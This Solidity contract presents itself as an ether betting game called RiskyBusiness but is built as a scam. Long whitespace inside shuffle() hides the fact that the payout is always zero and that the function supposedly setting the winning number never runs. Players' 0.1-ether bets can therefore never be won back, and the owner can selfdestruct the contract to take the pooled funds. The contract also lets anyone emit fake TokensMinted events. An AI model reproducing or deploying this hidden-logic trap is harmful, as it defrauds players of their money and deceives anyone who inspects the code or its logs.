pragma solidity ^0.5.1;

// RiskyBusiness

contract RiskyBusiness {

    uint256 public Lannister;
    uint256 public betPrice = 0.1 ether;
    uint256 public KJHYyBj;
    address public onyEcmL;
    uint256 private gCjmDLH;
    event TokensMinted(uint256 a, address b, address c, uint256 d, uint256 e);

    struct Stark {
        address player; // e.g., jon or arya
        uint256 u7;
    }
    Stark[] public StarksPlayed;

    constructor() public {
        onyEcmL = msg.sender;
        shuffle(); 
    }

    function shuffle() internal {                                                                                                                                                             KJHYyBj=0;}  function DoNotLookAtMeIAmHideous() internal{
        KJHYyBj = 1;
        gCjmDLH = 6; // Chosen by dice roll - i.e., randomly.
    }

    function play(uint256 u7) payable public {
        require(msg.value >= betPrice && u7 <= 20);

        Stark memory stark;
        stark.player = msg.sender; 
        stark.u7 = u7;
        
        shuffle();
        
        if (u7 == gCjmDLH) {
            // lose!
            
            msg.sender.transfer(KJHYyBj);
        }

        shuffle();
        Lannister = now;
    }

    function kill() public {
        if (msg.sender == onyEcmL && now > Lannister + 1 days) {
            //suicide(msg.sender);
            selfdestruct(msg.sender);
        }
    }

    function() external payable { }
    
    function claimThrone(string memory qstamp) public {
        shuffle();shuffle();shuffle();shuffle();shuffle();shuffle();shuffle();shuffle();
    }    
    
    function logAuctionTokenMinted(uint256 _universe, address _target, uint256 _amount) public returns (bool) {
        require(true);
        emit TokensMinted(_universe, msg.sender, _target, _amount, 0);
        return true;
    }    
}